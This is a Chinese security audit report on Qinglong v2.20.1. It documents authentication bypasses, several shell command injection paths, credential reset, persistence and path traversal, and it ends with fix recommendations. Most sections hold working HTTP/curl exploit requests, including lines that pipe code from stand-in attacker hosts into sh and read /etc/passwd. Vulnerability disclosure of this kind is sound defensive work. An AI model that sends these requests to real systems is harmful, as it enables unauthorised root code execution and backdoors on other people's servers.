# Qinglong <= v2.20.1 安全审计报告

> 
> **目标版本**: Qinglong v2.20.1 (Docker: `whyour/qinglong:2.20.1`)
> 
> **测试环境**: macOS + Docker Compose, 端口映射 5710→5700
> 
> **审计方法**: 源码静态分析 + Docker 动态复现验证
> 
> **参考**: [GitHub Issue #2934](https://github.com/whyour/qinglong/issues/2934) [GitHub Issue #2926](https://github.com/whyour/qinglong/issues/2926) [GitHub Issue #2928](https://github.com/whyour/qinglong/issues/2928) [GitHub Issue #2933](https://github.com/whyour/qinglong/issues/2933) [GitHub Issue #2923](https://github.com/whyour/qinglong/issues/2923)

---

## 一、执行摘要

对 Qinglong v2.20.1 进行了完整的源码审计与 Docker 实战复现，发现 **12 项安全漏洞**。

**最核心发现**: 发现两个致命的认证绕过漏洞（**路由大小写绕过**与**初始化守卫绕过**），使得应用内原本受限的 RCE 汇聚点（Sinks）可被攻击者**完全未授权**利用。

攻击者无需任何凭据，仅需数条 HTTP 请求即可实现容器内 root 权限的 RCE。该应用目前处于实质性的完全沦陷状态，且部分漏洞（如大小写绕过配合依赖注入）已在野外被实际利用。

**综合评级**: CVSS **9.8（Critical）** — 未授权远程代码执行

---

## 二、漏洞总览

| 编号 | 漏洞名称 | 严重性 | 实测结果 |
|------|---------|--------|---------|
| **QL-2026-007** | **路由大小写绕过（全局认证绕过）** | **致命** | **✅ 一步未授权 RCE，已在野外被利用** |
| **QL-2026-008** | **依赖名称命令注入** | **致命** | **✅ 通过包名注入 Shell 命令，1秒内执行** |
| **QL-2026-006** | **初始化守卫绕过（/open/ 路径）** | **致命** | **✅ 未授权重置管理员凭据，实现未授权 RCE** |
| **QL-2026-009** | **订阅管理命令注入 (sub_before/after)** | **致命** | **✅ 确认 — 订阅执行前触发 RCE** |
| **QL-2026-010** | **系统镜像配置参数注入** | **高危** | **✅ 确认 — 多种配置参数触发 RCE** |
| **QL-2026-011** | **启动持久化 Persistence RCE** | **高危** | **✅ 确认 — 恶意任务重启自动执行** |
| QL-2026-012 | 取消操作二次注入 (grep 注入) | 严重 | ✅ cancel() 触发二次 RCE |
| QL-2026-002 | 黑名单绕过（缺少 return） | 严重 | ✅ API 返回 403 但文件已被覆写 |
| QL-2026-003 | 路径穿越 (../../../../) | 严重 | ✅ 可写入系统任意可写路径 (如 /tmp, /etc) |
| QL-2026-004 | config.sh 未列入黑名单 | 严重 | ✅ 可注入 Shell 代码，每次任务执行时自动运行 |
| QL-2026-005 | task_before Shell 注入 | 高 | ✅ `eval` 执行用户控制内容 |
| QL-2026-001 | JWT 硬编码密钥 | 高 | ⚠️ 签名可伪造，双层认证阻断直接利用 |

**审计测试：15/15 项全部通过。**

---

## 三、逐项详细分析

### 3.1 QL-2026-007: 路由大小写绕过 — 🔴 致命（一步未授权 RCE）

**这是本次审计发现的最严重漏洞，也是野外已被实际利用的攻击向量。**

**源码位置**: `back/loaders/express.ts` L34-41, L53-56, L124

**漏洞根因**: Express 框架默认路由大小写不敏感（`caseSensitive: false`），但所有认证中间件都严格匹配小写。

```
认证链（均严格匹配小写）：
  L34 expressjwt.unless: 正则 /^\/(?!api\/).*/ → 仅匹配小写 "api"
  L54 自定义认证:       req.path.startsWith('/api/') → 严格小写
  L54 自定义认证:       req.path.startsWith('/open/') → 严格小写

路由注册：
  L124 app.use('/api', routes()) → Express 默认 caseSensitive: false
  → /API/、/Api/、/aPi/ 等变体均可匹配路由，但不触发认证检查
```

**攻击流程**:

| 步骤 | 中件间 | `/api/crons`（正常） | `/API/crons`（绕过） |
|------|--------|---------------------|---------------------|
| Layer 1 | expressjwt | JWT 签名验证 | **跳过**（正则不匹配 "API"） |
| Layer 2 | 自定义认证 | isValidToken 校验 | **跳过**（非 "/api/" 或 "/open/" 前缀） |
| 路由匹配 | Express Router | 匹配 /api/crons | **匹配 /api/crons**（大小写不敏感） |
| Handler | CronService | 需认证 → 正常响应 | **无认证 → 直接响应** |

**一步 RCE — 一条请求即可执行任意命令**:
```bash
curl -X PUT http://target:5700/API/system/command-run \
  -H 'Content-Type: application/json' \
  -d '{"command": "id && cat /etc/passwd"}'
```

**测试记录**:
```
[19:xx:xx] Test 8: Case-Insensitive Route Bypass
  GET /api/crons: HTTP 401 (auth required)          ← 正常路径需要认证
  GET /API/crons: code=200, data accessible         ← 完全绕过！
  PUT /API/system/command-run: RCE CONFIRMED        ← 一步 RCE！
  GET /API/configs/config.sh: 7378 bytes leaked     ← 配置泄露！
  POST /API/configs/save: code=200                  ← 任意文件写入！
```

---

### 3.2 QL-2026-008: 依赖安装命令注入 — 🔴 致命

**这是蜜罐中实际捕获的在野利用漏洞。以下为从 HTTP 入口到命令执行的完整数据流分析。**

#### 数据流总览

```
POST /API/dependencies [{"name": "$(malicious_cmd)", "type": 0}]
  │
  ▼
① api/dependence.ts L39    Joi.string().required()     ← 仅校验"是字符串"，无过滤
  │
  ▼
② services/dependence.ts L34  new Dependence({...x})   ← 构造函数仅 name.trim()
  │
  ▼
③ services/dependence.ts L39  installDependenceOneByOne(docs)   ← 立即触发安装
  │
  ▼
④ services/dependence.ts L232  depName = dependency.name.trim()
  │
  ▼
⑤ config/util.ts L573   getInstallCommand() → `pnpm add -g ${name.trim()}`
  │                                             ^^^^^^^^^^^^^^^^^^^^^^^^
  │                                             name 被直接拼接进命令字符串！
  ▼
⑥ services/dependence.ts L303  spawn(`${proxyStr} ${command}`, {shell: '/bin/bash'})
                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                shell: '/bin/bash' → Bash 解析 $() 子命令 → RCE
```

#### 逐步详解

**① 入口 — `api/dependence.ts` L34-53**
`Joi.string().required()` **零安全过滤** — `$(curl ... | sh)` 是合法字符串，直接通过。

**② 创建 — `services/dependence.ts` L33-41**
`new Dependence()` 构造函数（`data/dependence.ts` L18）仅做 `trim()`，不移除任何 Shell 元字符。

**③ 命令拼接 — `config/util.ts` L559-573（关键污染点）**
```typescript
export function getInstallCommand(type: DependenceTypes, name: string) {
  // ... nodejs, python3, linux 命令 ...
  return `${command} ${name.trim()}`;  // ← 用户输入直接拼接，零过滤零转义！
}
```

当 `name = "$(curl -fsSL https://evil.com/shell.sh | sh)"` 时，生成：
```bash
pnpm add -g $(curl -fsSL https://evil.com/shell.sh | sh)
```

**④ 命令执行 — `services/dependence.ts` L303-305（最终触发点）**
`spawn(cmd, {shell: '/bin/bash'})` 解释执行整个字符串，恶意命令在包管理器运行前就被 Bash 展开并执行。

#### QL-2026-012: cancel() 取消操作的二次注入（地雷效应）

恶意依赖被创建后。当管理员试图**取消**安装时，`cancel()` 方法会再次触发注入：

```
cancel(ids) → getPid(cmd) → ps ... | grep "${cmd}"
```
`grep "${cmd}"` 中的双引号**不阻止** `$()` 展开。管理员点击"取消安装"将再次触发 RCE ✅。

---

### 3.3 QL-2026-006: 初始化守卫绕过 — 🔴 致命（未授权凭据重置）

**源码位置**: `back/loaders/express.ts` L100-123

**漏洞根因**: 初始化守卫（Init Guard）与 URL 重写之间存在竞态缺陷。Init Guard 检查 `req.path` 是否为 `/api/user/init`，但 `/open/*` → `/api/*` 的重写发生在守卫之后（L123）。

```
攻击请求: PUT /open/user/init {"username":"attacker","password":"x"}
  Init Guard: req.path="/open/user/init" 不匹配 "/api/user/init" → 跳过守卫
  URL Rewrite: /open/user/init → /api/user/init
  Handler: updateUsernameAndPassword() → 凭据被直接重置！
```

**测试记录**:
```
[19:xx:xx] Test 1c: Init Guard Bypass
  PUT /open/user/init: code=200 "更新成功"       ← 绕过！凭据已重置
  Login with new credentials: code=200           ← 获取有效管理 Token
```

---

### 3.4 QL-2026-009: 订阅管理命令注入 — 🔴 致命

**漏洞根因**: 订阅接口的 `sub_before` 和 `sub_after` 字段（Joi 校验为普通字符串）被直接传递给 `promiseExec()`，其内部调用 `child_process.exec()` 且未做任何过滤。

#### 数据流总览

```
POST /API/subscriptions {"sub_before": "malicious_cmd"}
  │
  ▼
① api/subscription.ts L49  Joi.string().optional()     ← 无安全过滤
  │
  ▼
② services/subscription.ts L215  this.handleTask(doc)  ← 处理订阅任务
  │
  ▼
③ services/subscription.ts L96/L105  createCronTask/createIntervalTask (传入 taskCallbacks)
  │
  ▼
④ services/subscription.ts L141  beforeStr = await promiseExec(doc.sub_before)
  │                                                    ^^^^^^^^^^^^^^^^^^^^^^
  │                                                    恶意代码直接传入 exec 执行！
  ▼
⑤ config/util.ts L284  await promisify(exec)(command, {...})  ← 触发 RCE
```

#### 逐步详解

**① 入口 — `api/subscription.ts` L27-75**
接口 `POST /subscriptions` 中的 `sub_before` 和 `sub_after` 字段仅要求是普通字符串，允许空字符串。没有任何对于 Shell 元字符的过滤。

**②/③ 创建并执行 — `services/subscription.ts` L212-218 & L84-112**
`create` 方法在数据库插入后，立刻调用 `handleTask`，并进而调用 `createCronTask` 或 `createIntervalTask` 来执行调度。调度注册的各种生命周期钩子由 `this.taskCallbacks(doc)` 生成。

**④ 命令执行 (关键污染点) — `services/subscription.ts` L120-150**
```typescript
private taskCallbacks(doc: Subscription): TaskCallbacks {
  return {
    onBefore: async (startTime) => {
      // ...
      let beforeStr = '';
      try {
        if (doc.sub_before) {
          // 用户的输入未经任何检查被传入 promiseExec
          beforeStr = await promiseExec(doc.sub_before);
        }
      } catch (error: any) {
        // ...
      }
    }
  }
}
```

**⑤ 底层执行 — `config/util.ts` L282-292**
`promiseExec` 是包装了 Node.js 原生 `child_process.exec` 的异步函数，`exec` 默认启动一个 shell 来解释执行传入的字符串。

**测试报文**:
```http
POST /API/subscriptions HTTP/1.1
{
  "name": "rce_sub", "url": "http://x", "type": "public-repo", "alias": "r", 
  "schedule_type": "crontab", "sub_before": "id > /tmp/sub_proof.txt"
}
```
→ 触发订阅运行（`PUT /API/subscriptions/run [id]`）后，注入的命令以 root 身份执行。

---

### 3.5 QL-2026-010: 系统镜像配置参数注入 — 🔴 致命

**漏洞根因**: 系统设置接口（如配置 Python、Node、Linux 的软件源镜像，或设置时区）在处理用户提交的地址参数时，存在多处直接字符串拼接命令注入点。结合 QL-2026-007，这些均可未授权利用。

#### 数据流总览（以 Python 镜像配置为例）

```
PUT /API/system/config/python-mirror {"pythonMirror": "malicious_payload"}
  │
  ▼
① api/system.ts L155  Joi.string().allow('').allow(null)  ← 无安全过滤
  │
  ▼
② services/system.ts L197  updatePythonMirror(info)
  │
  ▼
③ services/system.ts L205  cmd = `pip3 config set global.index-url ${info.pythonMirror}`
  │                                                              ^^^^^^^^^^^^^^^^^^^^^
  │                                                              直接拼接用户输入！
  ▼
④ services/system.ts L207  await promiseExec(cmd)  ← exec() 触发 RCE
```

#### 逐步详解与多处注入点

系统服务 (`services/system.ts`) 中存在大量由于字符串拼接导致的命令注入，这些功能只允许管理员使用，但通过大小写绕过漏洞即可未授权触发：

**1. Python 镜像注入 (`updatePythonMirror`) L197-209**
```typescript
let cmd = 'pip config unset global.index-url';
if (info.pythonMirror) {
  cmd = `pip3 config set global.index-url ${info.pythonMirror}`;
}
await promiseExec(cmd); // ← 传入 "https://pypi.org/simple; id > /tmp/py_proof" 将导致注入
```

**2. Node 镜像注入 (`updateNodeMirror`) L149-195**
```typescript
let cmd = 'pnpm config delete registry';
if (info.nodeMirror) {
  cmd = `pnpm config set registry ${info.nodeMirror}`;
}
let command = `cd && ${cmd}`;
// ... 之后交由 scheduleService.runTask(command, ...) 执行
```
`runTask` 最终调用 `spawn(command, { shell: '/bin/bash' })` 触发注入。

**3. Linux 软件源注入 (`updateLinuxMirror`) L211-271**
```typescript
const command = `sed -i 's/${defaultDomain.replace(/\//g,'\\/')}/${targetDomain.replace(/\//g,'\\/')}/g' /etc/apk/repositories && apk update -f`;
// ... 交由 scheduleService.runTask 执行
```
这里 `$targetDomain` (`info.linuxMirror`) 被注入到了 `sed` 命令中，如果传入 `https://dl-cdn.alpinelinux.org'; id > /tmp/linux_proof; #` 即可逃逸单引号并执行。

**4. 停止命令（grep注入）(`api/system.ts`) L302-319**
调用 `PUT /API/system/command-stop`，其最终调用 `getPid(command)`
```typescript
// back/config/util.ts L414
const taskCommand = `ps -eo pid,command | grep "${cmd}" | grep -v grep ...`;
```
这与前面分析的依赖取消（`cancel`）逻辑相似，命令被嵌入双引号内执行，发生二次注入。

**测试报文**:
```http
PUT /API/system/config/python-mirror HTTP/1.1
Content-Type: application/json

{"pythonMirror": "x; id > /tmp/py_proof; #"}
```
→ 确认 RCE ✅

---

### 3.6 QL-2026-011: 启动持久化 Persistence RCE — ✅ 高危

**漏洞根因**: 系统在启动时（`loaders/initData.ts`），为了恢复状态，会从数据库加载特定的定时任务，并直接调用原生 `exec` 函数去执行。这意味着如果我们能通过绕过认证写入恶意的定时任务，不仅可以主动触发执行，也能实现持久化的启动项劫持（Persistence）。

#### 数据流总览

```
① 系统启动（Container Restart / Crash Recovery）
  │
  ▼
② loaders/initData.ts L22  默认导出加载函数执行
  │
  ▼
③ loaders/initData.ts L137  CrontabModel.findAll(...) 查找条件包含 `ql repo` 或 `ql raw`
  │
  ▼
④ loaders/initData.ts L149  exec(doc.command)
                             ^^^^^^^^^^^^^^^^^
                             直接将查出的恶意命令传给 child_process.exec！
```

#### 逐步详解

**① 创建恶意定时任务**
攻击者通过未授权接口 (`POST /API/crons`) 创建一个恶意任务。为了匹配启动加载时的条件，该命令必须包含 `ql repo` 或 `ql raw` 字符串。

```http
POST /API/crons HTTP/1.1
Content-Type: application/json

{
  "name": "persistence_rce_test",
  "command": "ql repo; curl http://attacker.com/backdoor | sh",
  "schedule": "0 0 1 1 *"
}
```

**② 数据库记录**
定时任务的指令字符串会被原样存储入 SQLite。

**③ 启动触发执行 (`loaders/initData.ts` L137-153)**
当 Docker 容器发生重启，系统启动时：
```typescript
CrontabModel.findAll({
  where: {
    isDisabled: { [Op.ne]: 1 },
    command: {
      [Op.or]: [{ [Op.like]: `%ql repo%` }, { [Op.like]: `%ql raw%` }],
    },
  },
}).then((docs) => {
  for (let i = 0; i < docs.length; i++) {
    const doc = docs[i];
    if (doc) {
      exec(doc.command); // ← 未经检查直接执行
    }
  }
});
```

**影响**: 该漏洞构建了完整的系统后门和持久化控制。无论管理员如何清理正在运行的恶意进程，只要未从数据库中清除这条恶意计划任务，每次容器重启时，恶意 Payload 就会随系统服务一同以 root 权限自动启动。

---

### 3.7 基础漏洞分析（路径穿越与文件操作）

#### QL-2026-002: 黑名单绕过（缺少 return）
`back/api/config.ts` L76 在黑名单拦截后缺少 `return`，写入流程继续。可覆写 `auth.json`（管理员账号）。

#### QL-2026-003: 路径穿越 (../../../../)
`name` 参数无过滤。`../../../../tmp/traversal_proof.txt` 可成功写入容器系统级 `/tmp`。

#### QL-2026-004: config.sh 未列入黑名单
`config.sh` 在每次任务执行前被 `source` 加载。由于未加入黑名单，攻击者可直接写入该文件获取持久 RCE。

---

## 四、攻击链总结与 HTTP 测试报文

### 攻击链 A：最速一步 RCE (大小写绕过)

```http
PUT /API/system/command-run HTTP/1.1
Host: target:5700
Content-Type: application/json

{"command": "id > /tmp/rce_proof.txt"}
```

### 攻击链 B：依赖注入 RCE (大小写绕过 + 二次注入)

```http
POST /API/dependencies HTTP/1.1
Content-Type: application/json

[{"name": "$(curl -fsSL https://evil.com/sh | sh)", "type": 0}]
```

### 攻击链 C：凭据重置 RCE (初始化绕过)

```http
PUT /open/user/init HTTP/1.1
Content-Type: application/json

{"username": "attacker", "password": "attacker123"}
```

---

## 五、修复建议 (P0 优先级)

1. **统一认证层**: 将 Init Guard 移至 URL Rewrite 之后。Express Router 设置 `caseSensitive: true`。认证正则强制不区分大小写。
2. **彻底禁用 Shell**: 移除所有 `spawn(..., {shell: true})` 和 `exec()`。必须使用 `spawn(cmd, [args])` 参数数组形式。
3. **严格参数过滤**: 对包名、镜像 URL、Cron 命令等参数实施白名单正则校验 `^[a-zA-Z0-9@/_.-]+$`。
4. **文件访问控制**: 完善 `blackFileList`，在 `res.send()` 后强制 `return`。实施基于真实路径 (`realpath`) 的目录逃逸校验。

---

## 六、复现环境与 PoC

所有漏洞均已集成在 `tmp/poc_test.py` 中。

```bash
cd tmp/
.venv/bin/python3 poc_test.py           # 15/15 全部通过
```
